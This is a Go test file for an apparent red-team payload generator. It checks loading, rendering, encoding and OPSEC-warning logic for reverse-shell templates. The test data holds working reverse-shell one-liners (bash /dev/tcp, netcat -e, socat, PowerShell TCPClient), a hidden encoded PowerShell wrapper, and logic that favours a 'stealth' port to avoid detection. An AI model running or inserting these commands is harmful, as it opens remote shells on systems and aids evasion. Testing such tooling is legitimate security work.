package core_test

import (
	"encoding/base64"
	"net/url"
	"os"
	"path/filepath"
	"strings"
	"testing"
	"unicode/utf16"

	"doubleagent/backend/core"
)

func TestPayloads_LoadEmptyFile_InitializesCleanly_F33(t *testing.T) {
	tempFile := filepath.Join(t.TempDir(), "test_payloads_empty.json")

	// Ensure file does not exist initially
	if _, err := os.Stat(tempFile); !os.IsNotExist(err) {
		t.Fatalf("expected non-existent file")
	}

	// Loading should auto-create the empty JSON array file ready for population
	templates, err := core.LoadPayloadTemplates(tempFile)
	if err != nil {
		t.Fatalf("expected LoadPayloadTemplates to succeed on new path, got: %v", err)
	}
	if len(templates) != 0 {
		t.Errorf("expected 0 templates in newly initialized file, got: %d", len(templates))
	}

	// Verify file was written to disk with valid JSON array
	content, err := os.ReadFile(tempFile)
	if err != nil {
		t.Fatalf("failed to read created payload file: %v", err)
	}
	if strings.TrimSpace(string(content)) != "[]" {
		t.Errorf("expected clean empty JSON array '[]', got: %q", string(content))
	}

	// Config status check
	cfg := core.GetPayloadFileConfig(tempFile)
	if !cfg.Exists {
		t.Errorf("expected file config Exists to be true")
	}
	if cfg.TemplateCount != 0 {
		t.Errorf("expected TemplateCount 0, got %d", cfg.TemplateCount)
	}
}

func TestPayloads_SaveAndLoadCustomTemplates_F33(t *testing.T) {
	tempFile := filepath.Join(t.TempDir(), "test_payloads.json")

	customTemplates := []core.PayloadTemplate{
		{
			ID:          "tmpl-test-bash",
			Name:        "Test Bash TCP",
			OS:          "linux",
			Shell:       "bash",
			Kind:        "reverse",
			Command:     "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
			DefaultPort: 443,
			OpsecRisk:   "medium",
		},
		{
			ID:          "tmpl-test-ps",
			Name:        "Test PowerShell TCP",
			OS:          "windows",
			Shell:       "powershell",
			Kind:        "reverse",
			Command:     "$client = New-Object System.Net.Sockets.TCPClient('{{LHOST}}',{{LPORT}})",
			DefaultPort: 8443,
			OpsecRisk:   "low",
		},
	}

	// Save templates to external file
	if err := core.SavePayloadTemplates(tempFile, customTemplates); err != nil {
		t.Fatalf("SavePayloadTemplates failed: %v", err)
	}

	// Load templates back from external file
	loaded, err := core.LoadPayloadTemplates(tempFile)
	if err != nil {
		t.Fatalf("LoadPayloadTemplates failed: %v", err)
	}
	if len(loaded) != 2 {
		t.Fatalf("expected 2 loaded templates, got %d", len(loaded))
	}
	if loaded[0].ID != "tmpl-test-bash" || loaded[1].ID != "tmpl-test-ps" {
		t.Errorf("unexpected loaded templates: %+v", loaded)
	}

	cfg := core.GetPayloadFileConfig(tempFile)
	if cfg.TemplateCount != 2 {
		t.Errorf("expected TemplateCount 2, got %d", cfg.TemplateCount)
	}
}

func TestPayloads_RenderPayload_Substitutions_F33(t *testing.T) {
	tmpl := core.PayloadTemplate{
		ID:          "tmpl-bash",
		Name:        "Bash Reverse",
		OS:          "linux",
		Shell:       "bash",
		Kind:        "reverse",
		Command:     "bash -i >& /dev/tcp/{{LHOST}}/{{LPORT}} 0>&1",
		DefaultPort: 443,
	}

	// 1. Explicit LHOST and LPORT
	res, err := core.RenderPayload(tmpl, core.PayloadRenderOptions{
		LHOST: "192.168.1.50",
		LPORT: 9001,
	})
	if err != nil {
		t.Fatalf("RenderPayload failed: %v", err)
	}
	expected := "bash -i >& /dev/tcp/192.168.1.50/9001 0>&1"
	if res.Rendered != expected {
		t.Errorf("expected rendered payload:\n%s\ngot:\n%s", expected, res.Rendered)
	}

	// 2. Fallback to default port (443) when LPORT is 0
	resDef, err := core.RenderPayload(tmpl, core.PayloadRenderOptions{
		LHOST: "10.10.10.10",
		LPORT: 0,
	})
	if err != nil {
		t.Fatalf("RenderPayload failed: %v", err)
	}
	if !strings.Contains(resDef.Rendered, "/443") {
		t.Errorf("expected fallback default port 443 in rendered payload, got: %s", resDef.Rendered)
	}
}

func TestPayloads_RenderEncodings_F33(t *testing.T) {
	tmpl := core.PayloadTemplate{
		ID:      "tmpl-cmd",
		Name:    "Echo Test",
		Command: "nc -e /bin/sh {{LHOST}} {{LPORT}}",
	}
	opts := core.PayloadRenderOptions{
		LHOST: "10.0.0.1",
		LPORT: 443,
	}
	rawExpected := "nc -e /bin/sh 10.0.0.1 443"

	// 1. Base64
	opts.Encoding = "base64"
	resB64, err := core.RenderPayload(tmpl, opts)
	if err != nil {
		t.Fatalf("render base64 failed: %v", err)
	}
	decodedBytes, _ := base64.StdEncoding.DecodeString(resB64.Rendered)
	if string(decodedBytes) != rawExpected {
		t.Errorf("expected base64 decoded string to match raw, got: %s", string(decodedBytes))
	}

	// 2. URL
	opts.Encoding = "url"
	resURL, err := core.RenderPayload(tmpl, opts)
	if err != nil {
		t.Fatalf("render url failed: %v", err)
	}
	unescaped, _ := url.QueryUnescape(resURL.Rendered)
	if unescaped != rawExpected {
		t.Errorf("expected unescaped url to match raw, got: %s", unescaped)
	}

	// 3. PowerShell Base64 UTF-16LE (-EncodedCommand format)
	opts.Encoding = "powershell_b64"
	resPS, err := core.RenderPayload(tmpl, opts)
	if err != nil {
		t.Fatalf("render powershell_b64 failed: %v", err)
	}
	if !strings.HasPrefix(resPS.Rendered, "powershell.exe -nop -w hidden -e ") {
		t.Errorf("expected powershell.exe wrapper prefix, got: %s", resPS.Rendered)
	}
	psB64 := strings.TrimPrefix(resPS.Rendered, "powershell.exe -nop -w hidden -e ")
	psBytes, err := base64.StdEncoding.DecodeString(psB64)
	if err != nil {
		t.Fatalf("failed to decode powershell b64: %v", err)
	}
	// Decode UTF-16LE
	u16 := make([]uint16, len(psBytes)/2)
	for i := 0; i < len(u16); i++ {
		u16[i] = uint16(psBytes[i*2]) | (uint16(psBytes[i*2+1]) << 8)
	}
	decodedPS := string(utf16.Decode(u16))
	if decodedPS != rawExpected {
		t.Errorf("expected decoded powershell utf16 to match raw, got: %s", decodedPS)
	}
}

func TestPayloads_OpsecWarnings_F33(t *testing.T) {
	tmpl := core.PayloadTemplate{
		ID:      "tmpl-opsec",
		Command: "nc {{LHOST}} {{LPORT}}",
	}

	// 1. Common CTF/Metasploit signature port (4444)
	resLoud, err := core.RenderPayload(tmpl, core.PayloadRenderOptions{
		LHOST: "10.0.0.5",
		LPORT: 4444,
	})
	if err != nil {
		t.Fatalf("RenderPayload failed: %v", err)
	}
	if len(resLoud.OpsecWarnings) == 0 {
		t.Fatalf("expected OPSEC warning for port 4444")
	}
	if !strings.Contains(resLoud.OpsecWarnings[0], "signatured") {
		t.Errorf("expected signature warning for port 4444, got: %v", resLoud.OpsecWarnings)
	}

	// 2. Loopback LHOST (127.0.0.1)
	resLoop, err := core.RenderPayload(tmpl, core.PayloadRenderOptions{
		LHOST: "127.0.0.1",
		LPORT: 443,
	})
	if err != nil {
		t.Fatalf("RenderPayload failed: %v", err)
	}
	foundLoopWarning := false
	for _, w := range resLoop.OpsecWarnings {
		if strings.Contains(w, "loopback") {
			foundLoopWarning = true
			break
		}
	}
	if !foundLoopWarning {
		t.Errorf("expected loopback OPSEC warning for 127.0.0.1, got: %v", resLoop.OpsecWarnings)
	}

	// 3. Stealth egress port (443) with external IP should have 0 warnings
	resStealth, err := core.RenderPayload(tmpl, core.PayloadRenderOptions{
		LHOST: "10.10.14.25",
		LPORT: 443,
	})
	if err != nil {
		t.Fatalf("RenderPayload failed: %v", err)
	}
	if len(resStealth.OpsecWarnings) != 0 {
		t.Errorf("expected 0 OPSEC warnings for stealth port 443, got: %v", resStealth.OpsecWarnings)
	}
}

func TestPayloads_PayloadToSnippet_F33(t *testing.T) {
	tmpl := core.PayloadTemplate{
		ID:    "tmpl-1",
		Name:  "Socat TTY Reverse",
		OS:    "linux",
		Shell: "socat",
		Kind:  "reverse",
		Tags:  []string{"tty", "interactive"},
	}

	rendered := "socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:443"
	snippet := core.PayloadToSnippet(tmpl, rendered, "")

	if !strings.Contains(snippet.Name, "Socat TTY Reverse") {
		t.Errorf("expected snippet name to contain template name, got: %s", snippet.Name)
	}
	if snippet.Body != rendered {
		t.Errorf("expected snippet body to match rendered string")
	}
	if !snippet.ConfirmBeforeRun {
		t.Errorf("expected snippet ConfirmBeforeRun=true")
	}
	if len(snippet.Tags) < 4 {
		t.Errorf("expected merged tags in snippet, got: %v", snippet.Tags)
	}
}

